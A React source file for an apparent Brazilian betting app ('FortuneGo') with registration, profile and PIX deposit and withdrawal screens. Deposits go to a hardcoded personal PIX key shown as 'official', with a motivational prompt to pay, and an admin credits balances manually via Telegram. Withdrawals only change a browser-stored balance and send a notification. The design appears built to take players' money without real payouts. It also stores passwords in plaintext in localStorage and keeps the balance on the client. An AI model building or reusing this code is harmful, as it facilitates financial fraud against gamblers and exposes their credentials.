import React, { useState, useEffect } from 'react';
import { ArrowLeft, Copy, Mail, Eye, EyeOff, Lock, Phone, Pencil, CreditCard, LogOut, Settings, ChevronRight } from 'lucide-react';
import { genDepositCode, genWithdrawCode, notifyDeposito, notifySaque } from '../utils/telegram';

// Types
export interface FortuneUser {
  phone: string;
  password: string;
  conta: string; // 11 digits like 43999069735
  userId: string; // 9 digits like 122199191
  nomeMarca: string; // 55L_xxxx
  pixKey?: string;
  pixType?: 'CPF' | 'Telefone' | 'Aleatória' | 'Email';
  balance: number;
}

const STORAGE_KEY = 'fortunego_user';

// Helpers
export function loadUser(): FortuneUser | null {
  try {
    const raw = localStorage.getItem(STORAGE_KEY);
    return raw ? JSON.parse(raw) : null;
  } catch { return null; }
}
export function saveUser(u: FortuneUser | null) {
  if (!u) localStorage.removeItem(STORAGE_KEY);
  else localStorage.setItem(STORAGE_KEY, JSON.stringify(u));
}
function genConta(phoneDigits: string) {
  // Use phone as base + random suffix to ensure unique, keep 11 digits
  const clean = phoneDigits.replace(/\D/g, '').slice(-11).padStart(11, '0');
  if (clean.length >= 10) return clean;
  return '439' + Math.floor(10000000 + Math.random()*90000000).toString();
}
function genUserId() {
  return Math.floor(100000000 + Math.random()*900000000).toString();
}
function genNomeMarca() {
  return `55L_${Math.floor(1000 + Math.random()*9000)}`;
}

// --- Registro Screen (REGISTRO.jpeg style) ---
export const RegistroScreen: React.FC<{ onRegistered: (u: FortuneUser) => void; onSwitchToLogin?: () => void }> = ({ onRegistered, onSwitchToLogin }) => {
  const [phone, setPhone] = useState('');
  const [senha, setSenha] = useState('');
  const [confSenha, setConfSenha] = useState('');
  const [show1, setShow1] = useState(false);
  const [show2, setShow2] = useState(false);
  const [err, setErr] = useState('');

  const handleSubmit = () => {
    setErr('');
    const p = phone.replace(/\D/g, '');
    if (p.length < 10 || p.length > 11) { setErr('Número inválido (DDD + 9 dígitos)'); return; }
    if (senha.length < 4) { setErr('Senha mínima 4 caracteres'); return; }
    if (senha !== confSenha) { setErr('Senhas não coincidem'); return; }
    const user: FortuneUser = {
      phone: p,
      password: senha,
      conta: genConta(p),
      userId: genUserId(),
      nomeMarca: genNomeMarca(),
      balance: 0,
    };
    saveUser(user);
    onRegistered(user);
  };

  return (
    <div className="min-h-[100dvh] bg-[#0a1f15] relative overflow-hidden flex flex-col">
      {/* subtle diamond pattern */}
      <div className="absolute inset-0 opacity-[0.04]" style={{backgroundImage: `repeating-linear-gradient(45deg, transparent 0 22px, #1a5c3a 22px 24px), repeating-linear-gradient(-45deg, transparent 0 22px, #1a5c3a 22px 24px)`}} />
      <div className="relative z-10 px-4 pt-6 pb-8 max-w-md mx-auto w-full flex-1 flex flex-col">
        {/* Top Perfil indicator + Registro header */}
        <div className="flex items-center justify-between mb-2">
          <div className="flex flex-col items-center">
            <div className="w-6 h-6 rounded-full bg-white/10 flex items-center justify-center text-[12px]">👤</div>
            <span className="text-[10px] text-amber-200/70 mt-1 font-bold">Perfil</span>
            <span className="w-8 h-0.5 bg-amber-400 mt-0.5 rounded-full" />
          </div>
          <div className="flex-1" />
        </div>

        <div className="flex items-end gap-2 mt-2 mb-6">
          <h1 className="text-[34px] font-black text-white leading-none tracking-tight" style={{fontFamily: 'Fredoka'}}>Registro</h1>
          <p className="text-[11px] text-white/60 leading-tight pb-1">Registro Já tem uma conta? <span onClick={onSwitchToLogin} className="text-[#4ade80] font-bold cursor-pointer hover:underline">Entrar agora</span></p>
        </div>

        {/* Phone */}
        <div className="relative mt-2">
          <div className="flex items-center gap-2 bg-white/5 border border-[#1a5c3a]/40 rounded-xl px-3 py-3 backdrop-blur">
            <div className="flex items-center gap-1 pr-3 border-r border-white/15">
              <span className="text-[18px] leading-none">🇧🇷</span>
              <span className="text-white text-sm font-bold">+55</span>
            </div>
            <input
              value={phone}
              onChange={e=>setPhone(e.target.value.replace(/\D/g,''))}
              placeholder="Número de telefone"
              inputMode="numeric"
              className="flex-1 bg-transparent outline-none text-white placeholder:text-white/35 text-sm"
            />
          </div>
        </div>

        {/* Senha */}
        <div className="relative mt-3">
          <div className="flex items-center gap-3 bg-white/5 border border-[#1a5c3a]/40 rounded-xl px-3 py-3">
            <span className="w-6 h-6 rounded bg-[#164633] flex items-center justify-center text-white"><Lock className="w-4 h-4 text-white fill-white/20" /></span>
            <input
              type={show1 ? 'text' : 'password'}
              value={senha}
              onChange={e=>setSenha(e.target.value)}
              placeholder="senha"
              className="flex-1 bg-transparent outline-none text-white placeholder:text-white/35 text-sm"
            />
            <button onClick={()=>setShow1(v=>!v)} className="text-white/50">{show1 ? <EyeOff className="w-5 h-5"/> : <Eye className="w-5 h-5"/>}</button>
          </div>
        </div>

        {/* Confirmar */}
        <div className="relative mt-3">
          <div className="flex items-center gap-3 bg-white/5 border border-[#1a5c3a]/40 rounded-xl px-3 py-3">
            <span className="w-6 h-6 rounded bg-[#164633] flex items-center justify-center"><Lock className="w-4 h-4 text-white" /></span>
            <input
              type={show2 ? 'text' : 'password'}
              value={confSenha}
              onChange={e=>setConfSenha(e.target.value)}
              placeholder="confirmar senha"
              className="flex-1 bg-transparent outline-none text-white placeholder:text-white/35 text-sm"
            />
            <button onClick={()=>setShow2(v=>!v)} className="text-white/50">{show2 ? <EyeOff className="w-5 h-5"/> : <Eye className="w-5 h-5"/>}</button>
          </div>
        </div>

        {err && <p className="text-red-400 text-xs mt-3 text-center">{err}</p>}

        <button onClick={handleSubmit} className="mt-6 w-full py-3.5 rounded-xl bg-gradient-to-r from-[#194C38] via-[#164633] to-[#113829] text-white font-black text-[15px] shadow-lg active:scale-[0.98] transition-transform">
          Registro
        </button>

        <p className="text-center text-[10px] text-white/25 mt-auto pt-6">Ao registrar você concorda com Termos • 18+</p>
      </div>
    </div>
  );
};

// --- Perfil Screen (PAGINA PERFIL.jpeg) ---
export const PerfilScreen: React.FC<{ user: FortuneUser; onOpenDeposito: ()=>void; onOpenSaque: ()=>void; onOpenMinhaConta: ()=>void; onLogout: ()=>void }> = ({ user, onOpenDeposito, onOpenSaque, onOpenMinhaConta, onLogout }) => {
  const copy = (t: string) => { navigator.clipboard.writeText(t); };
  return (
    <div className="min-h-[100dvh] bg-[#0a1f15] relative overflow-hidden flex flex-col pb-6">
      <div className="absolute inset-0 opacity-[0.06]" style={{backgroundImage: `repeating-linear-gradient(45deg, transparent 0 22px, #1a5c3a 22px 24px), repeating-linear-gradient(-45deg, transparent 0 22px, #1a5c3a 22px 24px)`}} />
      <div className="relative z-10 max-w-md mx-auto w-full">
        {/* Top Conta Card */}
        <div className="mx-3 mt-3 rounded-2xl bg-gradient-to-b from-[#194C38] to-[#0a1f15] border border-[#1a5c3a]/30 p-3 shadow-xl">
          <div className="flex items-center gap-3">
            <div className="w-14 h-14 rounded-xl overflow-hidden border-2 border-[#1a5c3a] bg-black/30">
              <img src="https://d13on7novkmyxh.cloudfront.net/game_pictures/g/EA/200/3/2000126/default.avif?g0=1788396721" alt="55L" className="w-full h-full object-cover" />
              <div className="absolute -mt-3 ml-8 bg-[#194C38] text-[9px] font-black px-1.5 py-0.5 rounded text-white">55L</div>
            </div>
            <div className="flex-1 min-w-0">
              <div className="flex items-center gap-1 text-white text-sm font-bold">Conta: {user.conta} <button onClick={()=>copy(user.conta)} className="ml-1 opacity-60"><Copy className="w-3 h-3"/></button></div>
              <div className="flex items-center gap-1 text-white/60 text-xs">ID: {user.userId} <button onClick={()=>copy(user.userId)} className="opacity-60"><Copy className="w-3 h-3"/></button></div>
              <div className="text-white/40 text-[11px]">Tel: +55 {user.phone.slice(0,2)} {user.phone.slice(2)}</div>
            </div>
            <div className="w-8 h-8 rounded bg-[#194C38]/20 border border-[#1a5c3a]/40 flex items-center justify-center"><Mail className="w-4 h-4 text-[#4ade80]"/></div>
          </div>
          <div className="flex gap-2 mt-3">
            <div className="flex-1 bg-black/30 rounded-lg border border-white/10 flex items-center px-3 py-2">
              <span className="text-white/50 text-xs">R$</span>
              <span className="text-white font-black ml-1">{user.balance.toFixed(0)}</span>
            </div>
            <button onClick={onOpenSaque} className="flex-1 rounded-lg bg-gradient-to-r from-[#0a1f15] to-[#132e23] border border-[#1a5c3a] text-[#4ade80] font-bold text-sm flex items-center justify-center gap-1"> <span className="text-[10px] bg-[#194C38] text-white px-1 rounded font-black">R$</span> Saque</button>
            <button onClick={onOpenDeposito} className="flex-1 rounded-lg bg-gradient-to-r from-[#194C38] to-[#164633] text-white font-black text-sm flex items-center justify-center gap-1">🪙 Depósito</button>
          </div>
        </div>


        {/* Menu */}
        <div className="mx-3 mt-3 rounded-2xl bg-[#132e23]/80 border border-white/5 overflow-hidden">
          {[
            { label: 'Suporte', icon: '🎧' },
            { label: 'Minha Conta', icon: '🛡️', onClick: onOpenMinhaConta, highlight: true },
            { label: 'Sair', icon: '🚪', onClick: onLogout },
          ].map(item=>(
            <button key={item.label} onClick={item.onClick} className={`w-full flex items-center gap-3 px-4 py-3.5 border-b border-white/5 last:border-0 text-left hover:bg-white/5 ${item.highlight ? 'bg-[#194C38]/10' : ''}`}>
              <span className="w-6 h-6 rounded bg-[#194C38]/20 flex items-center justify-center text-[14px]">{item.icon}</span>
              <span className="flex-1 text-white text-sm font-medium">{item.label}</span>
              <ChevronRight className="w-4 h-4 text-white/30" />
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};

// --- Minha Conta (CONTA.jpeg / MINHA CONTA.jpeg) ---
export const MinhaContaScreen: React.FC<{ user: FortuneUser; onBack: ()=>void; onSavePix: (pix: string, type: FortuneUser['pixType'])=>void; onLogout: ()=>void }> = ({ user, onBack, onSavePix, onLogout }) => {
  const [nome, setNome] = useState(user.nomeMarca);
  const [showPix, setShowPix] = useState(false);
  const [pixKey, setPixKey] = useState(user.pixKey || '');
  const [pixType, setPixType] = useState<FortuneUser['pixType']>(user.pixType || 'CPF');
  const savePix = () => { onSavePix(pixKey, pixType); setShowPix(false); };
  return (
    <div className="min-h-[100dvh] bg-[#0a1f15] relative flex flex-col">
      <div className="absolute inset-0 opacity-[0.06]" style={{backgroundImage: `repeating-linear-gradient(45deg, transparent 0 22px, #1a5c3a 22px 24px)`}} />
      <div className="relative z-10 max-w-md mx-auto w-full">
        <div className="flex items-center gap-3 px-3 py-4 border-b border-white/10 bg-[#0a1f15] sticky top-0">
          <button onClick={onBack} className="w-8 h-8 rounded-full bg-white/5 border border-white/10 flex items-center justify-center"><ArrowLeft className="w-4 h-4 text-white"/></button>
          <h1 className="flex-1 text-center text-white font-bold">Configuração</h1>
          <div className="w-8" />
        </div>

        <div className="px-4 pt-6 flex flex-col items-center">
          <div className="relative">
            <div className="w-20 h-20 rounded-2xl overflow-hidden border-2 border-[#1a5c3a] bg-black">
              <img src="https://d13on7novkmyxh.cloudfront.net/game_pictures/g/EA/200/3/2000126/default.avif?g0=1788396721" className="w-full h-full object-cover" alt="avatar"/>
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-[#194C38] border border-[#1a5c3a] flex items-center justify-center"><span className="text-white text-xs">📷</span></div>
          </div>
        </div>

        <div className="px-4 mt-6 space-y-3">
          <div>
            <label className="text-white/60 text-xs ml-1">Meu Nome de Marca</label>
            <div className="mt-1 flex items-center gap-2 bg-white/5 border border-[#1a5c3a]/30 rounded-xl px-3 py-3">
              <input value={nome} onChange={e=>setNome(e.target.value)} className="flex-1 bg-transparent outline-none text-white text-sm" />
              <Pencil className="w-4 h-4 text-white/40" />
            </div>
          </div>
          <div>
            <label className="text-white/60 text-xs ml-1">Conta registrada</label>
            <div className="mt-1 bg-black/20 border border-white/5 rounded-xl px-3 py-3 text-white font-bold text-sm">{user.conta}</div>
          </div>
          <div>
            <label className="text-white/60 text-xs ml-1">Senha</label>
            <div className="mt-1 flex items-center bg-white/5 border border-[#1a5c3a]/30 rounded-xl px-3 py-3 text-white/40 text-sm tracking-widest">•••••••• <span className="ml-auto"><Pencil className="w-4 h-4 text-white/40"/></span></div>
          </div>

          <button onClick={()=>setShowPix(v=>!v)} className="w-full mt-2 flex items-center gap-3 bg-white/5 border border-[#1a5c3a]/30 rounded-xl px-3 py-3 text-white text-sm">
            <CreditCard className="w-5 h-5 text-[#4ade80]" />
            <span className="flex-1 text-left">{user.pixKey ? `PIX: ${user.pixKey} (${user.pixType})` : 'Informações de Saque (PIX)'}</span>
            <ChevronRight className="w-4 h-4 text-white/30" />
          </button>

          {showPix && (
            <div className="rounded-xl bg-[#132e23] border border-[#1a5c3a]/30 p-3 space-y-2">
              <p className="text-[#4ade80] text-xs font-bold">Dados PIX para saque rápido</p>
              <div className="flex gap-2">
                {(['CPF','Telefone','Aleatória','Email'] as const).map(t=>(
                  <button key={t} onClick={()=>setPixType(t)} className={`flex-1 py-1.5 rounded-lg text-xs font-bold border ${pixType===t ? 'bg-[#194C38] text-white border-[#1a5c3a]' : 'bg-white/5 text-white/60 border-white/10'}`}>{t}</button>
                ))}
              </div>
              <input value={pixKey} onChange={e=>setPixKey(e.target.value)} placeholder={pixType==='CPF' ? '000.000.000-00' : pixType==='Telefone' ? '+55 (11) 9...' : 'chave pix'} className="w-full bg-white/5 border border-white/10 rounded-lg px-3 py-2.5 text-white text-sm placeholder:text-white/30 outline-none" />
              <button onClick={savePix} className="w-full py-2 rounded-lg bg-gradient-to-r from-[#194C38] to-[#164633] text-white font-bold">Salvar PIX</button>
              <p className="text-[10px] text-white/40 text-center">Seus dados PIX ficam salvos localmente para saque em 1 clique</p>
            </div>
          )}

          <button onClick={onLogout} className="w-full mt-4 flex items-center gap-3 bg-white/5 border border-white/10 rounded-xl px-3 py-3.5 text-white text-sm">
            <LogOut className="w-5 h-5 text-white/60" /> Sair da conta <ChevronRight className="w-4 h-4 text-white/30 ml-auto" />
          </button>
        </div>
      </div>
    </div>
  );
};

// --- Deposito (DEPOSITO.jpeg) + Saque (SAQUE.jpeg) combined ---
export const DepositoSaqueScreen: React.FC<{ user: FortuneUser; onBack: ()=>void; mode: 'deposito' | 'saque'; onBalanceChange: (delta: number)=>void }> = ({ user, onBack, mode, onBalanceChange }) => {
  const [tab, setTab] = useState<'deposito' | 'saque'>(mode);
  const [canal, setCanal] = useState('PIX-1');
  const [valor, setValor] = useState('');
  const [showPixModal, setShowPixModal] = useState(false);
  const [pendingDeposit, setPendingDeposit] = useState<{ amount: number; extra: number; code: string } | null>(null);
  const [copied, setCopied] = useState(false);

  const pixKey = "43999069735"; // Chave PIX oficial

  const quickDeposito = [
    { v: 10, extra: 0.5 }, { v: 30, extra: 1.5 }, { v: 50, extra: 2.5 },
    { v: 100, extra: 3.5 }, { v: 500, extra: 25 }, { v: 1000, extra: 35 },
    { v: 5000, extra: 155 }, { v: 10000, extra: 255 }, { v: 15000, extra: 355 },
  ];
  const quickSaque = [20,50,100,200,500,1000];

  const handleDepositoClick = (amount?: number) => {
    const amt = amount ?? parseInt(valor || '0');
    if (amt < 10 || amt > 15000) { alert('Digite um valor entre R$ 10 e R$ 15.000'); return; }
    const extra = quickDeposito.find(q=>q.v===amt)?.extra || 0;
    const code = genDepositCode(user.userId, amt);

    setPendingDeposit({ amount: amt, extra, code });
    setValor('');
    notifyDeposito(user, canal, amt, code).catch(()=>{});
    setShowPixModal(true);
  };

  const copyPixKey = () => {
    navigator.clipboard.writeText(pixKey);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  const handleSaque = () => {
    const amt = parseInt(valor || '0');
    if (amt < 20 || amt > 15000) { alert('Saque R$20 ~ R$15000'); return; }
    if (user.balance < amt) { alert('Saldo insuficiente'); return; }
    if (!user.pixKey) { alert('Cadastre seu PIX em Minha Conta primeiro'); return; }
    const code = genWithdrawCode(user.userId, amt);
    onBalanceChange(-amt);
    setValor('');
    notifySaque(user, amt, code).catch(()=>{});
    alert(`Saque de R$${amt} código ${code} para PIX ${user.pixKey} solicitado! Admin notificado no Telegram.`);
  };

  return (
    <div className="min-h-[100dvh] bg-[#0a1f15] flex flex-col relative">
      <div className="absolute inset-0 opacity-[0.05]" style={{backgroundImage: `repeating-linear-gradient(45deg, transparent 0 22px, #1a5c3a 22px 24px)`}} />
      <div className="relative z-10 max-w-md mx-auto w-full flex-1 flex flex-col">
        {/* Header */}
        <div className="flex items-center gap-3 px-3 py-3 bg-[#0a1f15] border-b border-white/5 sticky top-0">
          <button onClick={onBack} className="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center"><ArrowLeft className="w-4 h-4 text-white"/></button>
          <h1 className="flex-1 text-center text-white font-bold capitalize">{tab === 'deposito' ? 'Depósito' : 'Saque'}</h1>
          <div className="w-8" />
        </div>

        {/* Tab switcher Saque/Depósito both visible as requested */}
        <div className="mx-3 mt-3 p-1 rounded-full bg-black/30 border border-white/5 flex">
          <button onClick={()=>setTab('deposito')} className={`flex-1 py-2 rounded-full font-bold text-sm ${tab==='deposito' ? 'bg-gradient-to-r from-[#194C38] to-[#164633] text-white' : 'text-white/60'}`}>Depósito</button>
          <button onClick={()=>setTab('saque')} className={`flex-1 py-2 rounded-full font-bold text-sm ${tab==='saque' ? 'bg-gradient-to-r from-[#194C38] to-[#164633] text-white' : 'text-white/60'}`}>Saque</button>
        </div>

        <div className="px-3 mt-3">
          <p className="text-white/70 text-xs mb-2">Canal de pagamento:</p>
          <div className="flex gap-2 overflow-x-auto pb-1">
            {['PIX-1','PIX-2','PIX-3','PIX-4'].map(c=>(
              <button key={c} onClick={()=>setCanal(c)} className={`px-5 py-2 rounded-lg font-bold text-sm whitespace-nowrap border ${canal===c ? 'bg-gradient-to-r from-[#194C38] to-[#164633] text-white border-[#1a5c3a]' : 'bg-white/10 text-white/70 border-white/10'}`}>{c}</button>
            ))}
          </div>
        </div>

        {tab==='deposito' ? (
          <>
            <div className="mx-3 mt-4 rounded-xl bg-[#132e23] border border-[#1a5c3a]/30 p-3">
              <p className="text-white/60 text-[11px] flex items-center gap-1">ⓘ Bônus resgatável após 1x faturamento</p>
              <div className="mt-2 flex items-center gap-2 bg-black/20 border border-[#1a5c3a]/40 rounded-xl px-3 py-3">
                <span className="text-white font-black">R$</span>
                <input value={valor} onChange={e=>setValor(e.target.value.replace(/\D/g,''))} placeholder="valor(10 ~ 15000)" className="flex-1 bg-transparent outline-none text-white placeholder:text-white/30 text-sm" inputMode="numeric" />
                <span className="text-white/50 text-xs">Extra +{quickDeposito.find(q=>String(q.v)===valor)?.extra ?? 0}</span>
              </div>
            </div>

            <div className="grid grid-cols-3 gap-2 px-3 mt-3">
              {quickDeposito.map(q=>(
                <button key={q.v} onClick={()=>handleDepositoClick(q.v)} className="relative bg-[#132e23] border border-white/5 rounded-xl py-3 flex flex-col items-center cursor-pointer">
                  <span className="absolute -top-1 -right-1 bg-[#194C38] text-white text-[9px] font-black px-1.5 py-0.5 rounded-full">+{q.extra}</span>
                  <span className="text-white font-bold text-sm">R$ {q.v}</span>
                </button>
              ))}
            </div>

            <button onClick={()=>handleDepositoClick()} className="mx-3 mt-6 py-3 rounded-xl bg-gradient-to-r from-[#194C38] via-[#164633] to-[#113829] text-white font-black cursor-pointer">Depósito</button>
            <p className="text-center text-white/30 text-[10px] mt-2">Meu Saldo: R$ {user.balance.toFixed(0)} • PIX {canal} instantâneo</p>
          </>
        ) : (
          <>
            <div className="text-center mt-6">
              <p className="text-white/60 text-xs">Meu Saldo:</p>
              <p className="text-white font-black text-3xl mt-1">{user.balance.toFixed(0)}</p>
            </div>
            <div className="mx-3 mt-4">
              <p className="text-white/70 text-xs mb-2">Valor do saque</p>
              <div className="flex items-center gap-2 bg-black/20 border border-[#1a5c3a]/40 rounded-xl px-3 py-3">
                <span className="text-white font-black">R$</span>
                <input value={valor} onChange={e=>setValor(e.target.value.replace(/\D/g,''))} placeholder="valor(20 ~ 15000)" className="flex-1 bg-transparent outline-none text-white placeholder:text-white/30 text-sm" inputMode="numeric" />
              </div>
              <div className="flex gap-2 mt-2 flex-wrap">
                {quickSaque.map(v=>(
                  <button key={v} onClick={()=>setValor(String(v))} className="px-3 py-1.5 rounded-full bg-white/5 border border-white/10 text-white/70 text-xs cursor-pointer">R$ {v}</button>
                ))}
              </div>
              <button onClick={handleSaque} className="w-full mt-6 py-3 rounded-xl bg-gradient-to-r from-[#194C38] via-[#164633] to-[#113829] text-white font-black cursor-pointer">Saque</button>
              <p className="text-center text-white/30 text-[11px] mt-2">PIX: {user.pixKey ? `${user.pixKey} (${user.pixType})` : 'cadastre em Minha Conta'}</p>
            </div>
          </>
        )}
      </div>

      {/* PIX Deposit Modal with copy key and motivational phrase */}
      {showPixModal && pendingDeposit && (
        <div className="fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4 animate-in fade-in">
          <div className="bg-gradient-to-b from-[#0f2d21] via-[#0a1f15] to-[#071710] border-2 border-emerald-500/50 rounded-3xl max-w-sm w-full p-6 shadow-2xl relative text-center">

            <div className="w-12 h-12 mx-auto mb-3 rounded-2xl bg-emerald-500/20 border border-emerald-500/40 flex items-center justify-center text-emerald-400 font-bold text-xl">
              ⚡
            </div>

            <h3 className="text-xl font-fredoka font-black text-white mb-1">
              PIX de R$ {pendingDeposit.amount}
            </h3>
            <p className="text-xs text-emerald-400 font-semibold mb-4">
              Canal {canal} {pendingDeposit.extra > 0 ? `(Bônus +R$ ${pendingDeposit.extra})` : ''}
            </p>

            {/* Motivational message as requested */}
            <div className="bg-amber-500/10 border border-amber-500/30 rounded-2xl p-3.5 mb-4 shadow-inner">
              <p className="text-amber-300 font-bold text-xs">
                🌟 "Acredite que sua hora vai chegar!"
              </p>
              <p className="text-slate-300 text-[11px] mt-1.5 leading-relaxed">
                Copie a chave PIX abaixo, faça o pagamento no seu banco e aguarde. Assim que o pagamento for confirmado, o administrador creditará seu saldo!
              </p>
            </div>

            {/* PIX Key Box */}
            <div className="bg-black/50 border border-slate-700 rounded-2xl p-3.5 mb-4">
              <span className="text-[10px] uppercase tracking-wider text-slate-400 block mb-1 font-bold">Chave PIX Oficial</span>
              <div className="text-lg font-black text-amber-300 select-all tracking-wide">
                {pixKey}
              </div>
            </div>

            {/* Copy Button */}
            <button
              onClick={copyPixKey}
              className={`w-full py-3.5 rounded-xl font-black text-sm flex items-center justify-center gap-2 shadow-lg transition-all cursor-pointer ${
                copied
                  ? 'bg-emerald-600 text-white'
                  : 'bg-gradient-to-r from-emerald-600 to-green-500 text-white hover:brightness-110 active:scale-95'
              }`}
            >
              <Copy className="w-4 h-4" />
              {copied ? 'Chave PIX Copiada com Sucesso!' : 'Copiar Chave PIX'}
            </button>

            {/* Close / Done */}
            <button
              onClick={() => {
                setShowPixModal(false);
                setPendingDeposit(null);
              }}
              className="mt-3 w-full py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold border border-slate-700 cursor-pointer"
            >
              Já copieí / Aguardar Crédito
            </button>

          </div>
        </div>
      )}
    </div>
  );
};

